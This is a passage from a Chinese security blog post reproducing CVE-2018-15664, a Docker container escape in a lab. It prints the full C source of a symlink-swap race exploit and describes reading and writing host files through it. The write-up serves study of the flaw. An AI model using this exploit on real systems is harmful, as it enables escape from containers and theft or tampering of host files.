*</span></span><br><span class="line"><span class="comment"> * This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"> * but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"> * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"> * GNU General Public License for more details.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"> * along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> usage() \</span></span><br><span class="line"><span class="meta">	do &#123; printf(<span class="string">&quot;usage: symlink_swap &lt;symlink&gt;\n&quot;</span>); exit(1); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bail(msg) \</span></span><br><span class="line"><span class="meta">	do &#123; perror(<span class="string">&quot;symlink_swap: &quot;</span> msg); exit(1); &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* No glibc wrapper for this, so wrap it ourselves. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RENAME_EXCHANGE (1 &lt;&lt; 1)</span></span><br><span class="line"><span class="comment">/*int renameat2(int olddirfd, const char *oldpath,</span></span><br><span class="line"><span class="comment">              int newdirfd, const char *newpath, int flags)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* usage: symlink_swap &lt;symlink&gt; */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">		usage();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *symlink_path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">char</span> *stash_path = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (asprintf(&amp;stash_path, <span class="string">&quot;%s-stashed&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;create stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Create a dummy file at symlink_path. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">if</span> (!lstat(symlink_path, &amp;sb)) &#123;</span><br><span class="line">		<span class="type">int</span> err;</span><br><span class="line">		<span class="keyword">if</span> (sb.st_mode &amp; S_IFDIR)</span><br><span class="line">			err = rmdir(symlink_path);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			err = unlink(symlink_path);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			bail(<span class="string">&quot;unlink symlink_path&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now create a symlink to &quot;/&quot; (which will resolve to the host&#x27;s root if we</span></span><br><span class="line"><span class="comment">	 * win the race) and a dummy directory at stash_path for us to swap with.</span></span><br><span class="line"><span class="comment">	 * We use a directory to remove the possibility of ENOTDIR which reduces</span></span><br><span class="line"><span class="comment">	 * the chance of us winning.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (symlink(<span class="string">&quot;/&quot;</span>, symlink_path) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;create symlink_path&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mkdir(stash_path, <span class="number">0755</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		bail(<span class="string">&quot;mkdir stash_path&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we do a RENAME_EXCHANGE forever. */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">int</span> err = renameat2(AT_FDCWD, symlink_path,</span><br><span class="line">	                        AT_FDCWD, stash_path, RENAME_EXCHANGE);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			perror(<span class="string">&quot;symlink_swap: rename exchange failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里使用metarget靶场进行漏洞测试。</p>
<h3 id="正常操作"><a href="#正常操作" class="headerlink" title="正常操作"></a>正常操作</h3><p>将容器中的文件ex复制到宿主机中，FollowSymlinkInScope方法检查这个路径合法，evalSymlinksInScope方法对这个路径进行解析。执行的结果是将容器中的ex复制到宿主机的当前目录下。</p>
<h3 id="恶意操作"><a href="#恶意操作" class="headerlink" title="恶意操作"></a>恶意操作</h3><p>将容器中的文件ex复制到宿主机中，FollowSymlinkInScope方法检查这个路径合法，在evalSymlinksInScope方法对这个路径进行解析之前将路径替换为恶意符号链接指向宿主机的&#x2F;w00t_w00t_im_a_flag。执行的结果是将&#x2F;w00t_w00t_im_a_flag文件复制到宿主机当前目录下。</p>
<p>运行run_read.sh，并通过grep查看是否写入成功。</p>
<p>非常夸张的是在竞争中获得root的主机访问权限&lt;1%,但仍有机会竞争成功。</p>
<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230912212957974.png" alt="image-20230912212957974"></p>
<h3 id="正常操作-1"><a href="#正常操作-1" class="headerlink" title="正常操作"></a>正常操作</h3><p>要将宿主机的正常文件localpath复制到容器中，FollowSymlinkInScope方法检查这个路径合法，evalSymlinksInScope方法对这个路径进行解析。执行的结果是将宿主机的当前目录的localpath复制到容器中的&#x2F;w00t_w00t_im_a_flag位置。</p>
<h3 id="恶意操作-1"><a href="#恶意操作-1" class="headerlink" title="恶意操作"></a>恶意操作</h3><p>我们在容器中创建了一个指向宿主机根目录&#x2F;的恶意符号链接，在进行FollowSymlinkInScope方法时，对正常文件localpath进行检查，但在evalSymlinksInScope方法中传入的路径为指向宿主机根目录&#x2F;的恶意符号链接。执行的结果是将宿主机的当前目录的localpath复制到宿主机&#x2F;w00t_w00t_im_a_flag位置。</p>
<p>运行run_write.sh</p>
<p>我们发现这很快就完成了竞争，</p>
<p>这是因为 Docker 内部有一个**”chrootarchive”概念**，其中存档是从 chroot 中提取的。然而，Docker 不会 chroot 到容器的”&#x2F;“（这会使此漏洞无效），而是 chroot 到存档目标的父目录——这是攻击者控制的。结果，这实际上导致攻击更有可能成功（一旦 chroot 完成竞争，其余的攻击就保证成功）。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912170647623.png" alt="image-20230912170647623"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912170658008.png" alt="image-20230912170658008"></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272962.htm">CVE-2018-15664：符号链接替换漏洞</a></p>
</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: Sally</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-12</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>About2794words, 9min18secread</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://phoenixmerk.github.io/2023/09/12/CVE-2018-15664 利用符号链接容器逃逸/,Sally's Blog,CVE-2018-15664 利用符号链接容器逃逸,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2023/10/09/CVE-2019-1002101%20kubectl%20cp%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" title="CVE-2019-1002101 kubectl cp容器逃逸">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/09/02/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E6%BA%AF%E6%BA%90%E7%BB%8F%E5%8E%86/" title="记录一次真实溯源经历">Próximo post</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>